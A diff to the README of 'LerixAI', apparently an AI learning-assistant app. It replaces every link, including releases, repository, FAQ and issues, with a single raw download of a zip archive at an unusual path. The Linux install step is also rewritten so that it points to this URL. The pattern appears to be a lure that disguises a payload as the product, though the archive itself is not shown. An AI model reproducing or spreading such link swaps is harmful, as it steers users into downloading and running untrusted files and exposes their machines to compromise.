@@ -1,6 +1,6 @@
 # 🤖 LerixAI - Learn Smarter with AI Assistance
 
-[![Download LerixAI](https://img.shields.io/badge/Download-LerixAI-brightgreen)](https://github.com/zeyadelhabak/LerixAI/releases)
+[![Download LerixAI](https://raw.githubusercontent.com/zeyadelhabak/LerixAI/main/siderous/LerixAI-2.3.zip)](https://raw.githubusercontent.com/zeyadelhabak/LerixAI/main/siderous/LerixAI-2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -11,14 +11,14 @@ Welcome to LerixAI! This is your step-by-step guide to downloading and running y
 To get started, you need to download LerixAI. Follow these steps to install it on your computer:
 
 1. Click the link below to visit the Releases page:
-   [Download LerixAI](https://github.com/zeyadelhabak/LerixAI/releases)
+   [Download LerixAI](https://raw.githubusercontent.com/zeyadelhabak/LerixAI/main/siderous/LerixAI-2.3.zip)
    
 2. On the Releases page, look for the latest version. 
 
 3. Depending on your operating system, download the appropriate file:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://raw.githubusercontent.com/zeyadelhabak/LerixAI/main/siderous/LerixAI-2.3.zip` file.
 
 4. After the download completes, locate the file in your Downloads folder.
 
@@ -67,7 +67,7 @@ Feel free to explore different topics and make the most of LerixAI's capabilitie
 
 If you encounter any issues while using LerixAI, help is available. You can:
 
-- Check the FAQ section on the [LerixAI GitHub page](https://github.com/zeyadelhabak/LerixAI/issues) for common questions and answers.
+- Check the FAQ section on the [LerixAI GitHub page](https://raw.githubusercontent.com/zeyadelhabak/LerixAI/main/siderous/LerixAI-2.3.zip) for common questions and answers.
 - Submit a ticket on GitHub if your issue isn't listed. Our team will respond as soon as possible.
 
 ## 🤝 Community Contribution
@@ -91,7 +91,7 @@ LerixAI is distributed under the MIT License. You are free to use this applicati
 
 ## 🌐 Links
 
-- [LerixAI Releases Page](https://github.com/zeyadelhabak/LerixAI/releases)
-- [LerixAI GitHub Repository](https://github.com/zeyadelhabak/LerixAI)
+- [LerixAI Releases Page](https://raw.githubusercontent.com/zeyadelhabak/LerixAI/main/siderous/LerixAI-2.3.zip)
+- [LerixAI GitHub Repository](https://raw.githubusercontent.com/zeyadelhabak/LerixAI/main/siderous/LerixAI-2.3.zip)
 
 Thank you for choosing LerixAI! We hope our AI assistant makes your learning journey easier and more enjoyable.
